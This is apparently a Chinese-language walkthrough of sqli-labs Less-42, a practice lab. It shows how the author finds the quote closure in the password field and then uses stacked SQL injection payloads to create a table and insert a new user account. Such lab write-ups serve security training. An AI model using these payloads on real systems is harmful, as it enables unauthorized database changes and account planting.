---
title: Less - 42
date: 2023-03-21T11:40:01Z
lastmod: 2023-03-21T13:12:14Z
---

# Less - 42

---

# 通关教程

---

## 1、判断闭合

---

发现与less-24的页面一模一样

​![image](assets/image-20230321130554-2fxiarc.png)​

尝试发现这关使用二次注入是行不通的，然后username的位置也是没有SQL注入漏洞的，所以这关我们尝试在password的位置使用堆叠注入攻击。在password的位置输入admin'

​![image](assets/image-20230321130648-623fv2r.png)​

根据报错信息判断闭合方式为'#，并且为字符型注入

---

## 2、创建一张表

---

```http
a';create table test like users;#
```

​![image](assets/image-20230321130902-oxy1fyh.png)​

​![image](assets/image-20230321131029-wdy9yk8.png)​

---

## 3、创建一个新用户

---

```http
a';insert into users values(18,'cmx','cmx');#
```

​![image](assets/image-20230321131147-w5ah0ek.png)​

​![image](assets/image-20230321131212-34xkr74.png)​

‍

---
